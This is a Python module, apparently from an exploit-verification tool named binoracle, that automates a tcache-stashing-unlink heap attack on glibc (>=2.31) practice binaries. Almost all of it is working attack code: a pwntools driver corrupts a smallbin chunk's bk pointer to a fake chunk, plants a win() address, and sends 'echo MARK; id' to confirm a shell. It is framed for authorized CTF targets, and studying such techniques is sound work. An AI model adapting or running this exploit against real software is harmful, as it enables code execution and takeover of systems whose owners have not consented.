"""Tcache-stashing-unlink attack, verified by execution.

When `_int_malloc` serves a request from a SMALLBIN while the matching tcache bin still has room,
glibc "stashes" the remaining smallbin chunks into the tcache; the stash loop unlinks each chunk
(`bck->fd = bin`) and `tcache_put`s it. Corrupting the `bk` of a smallbin chunk to a FAKE chunk
makes that fake chunk get stashed, so a later allocation of that size returns an attacker-chosen
address -> overwrite a function pointer -> shell.

Modern glibc (>=2.31) hardened the loop with `if (bck->fd != tc_victim) malloc_printerr("smallbin
double linked list corrupted")`, which is exactly why a naive stash crashes on current libc. The
practice target reproduces the stash path *including that check* and satisfies it (the trigger is a
calloc, which bypasses the tcache like glibc's), so binoracle verifies the MODERN hardened variant,
not a pre-2.31 one. The attacker-controlled action is a single `bk` overflow. The sandbox runs with
ASLR off and `hobj`/`win` are fixed symbols, so the fake-chunk address is deterministic. For
AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import elf_symbol_names, run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (stash driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
hobj = sym.get("hobj") or sym.get("fake") or sym.get("fnptr")
win = sym.get("win")
if hobj is None or win is None:
    print("NOT_APPLICABLE (no stashing shape: need hobj(fake chunk)+win symbols)"); sys.exit(1)

MARK = b"BINORACLE_STASH_PWNED"
io = None
try:
    io = process([name], aslr=False)
    io.recvuntil(b"stash: ")
    io.send(p64(0) + p64(hobj))          # corrupt ctc->bk = &fake (fd at user+0, bk at user+8)
    io.recvuntil(b"win: ")
    io.send(p64(win))                    # plant win into the fake chunk (hobj.fn)
    time.sleep(0.2)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED hobj=%#x win=%#x" % (hobj, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def _stash_applicable(binary: str) -> bool:
    """Chequeo barato: necesita un chunk falso objetivo (hobj/fake/fnptr) y win()."""
    names = elf_symbol_names(binary)
    if names is None:
        return True
    hobj = any(n in names for n in ("hobj", "fake", "fnptr"))
    return hobj and "win" in names


def autostash(binary: str) -> dict:
    """Tcache-stashing-unlink verificado por ejecucion (contra un asignador que reproduce el stash
    de smallbin->tcache, incluido el chequeo de consistencia >=2.31). Necesita la forma de practica
    (hobj/win). Docker o sandbox nativo (ASLR off); degrada limpio."""
    if not _stash_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin hobj/fake/fnptr + win)"}
    res = run_driver(binary, _DRIVER, ".binoracle_stash.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"tcache stashing unlink (stash de smallbin->tcache; chequeo >=2.31 satisfecho): "
                   f"el chunk falso entra en tcache -> alloc en direccion elegida -> hijack -> shell "
                   f"verificada ({eng})"
                   if res.get("verified")
                   else f"tcache stashing: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_stash(r: dict) -> str:
    out = ["## Auto tcache stashing unlink (stash smallbin->tcache, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: glibc >=2.31 endurece el stash con el chequeo `bck->fd == tc_victim`; la "
               "verificacion reproduce ese chequeo y lo SATISFACE (disparo via calloc, que esquiva "
               "el tcache), demostrando la variante moderna, no una pre-2.31._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
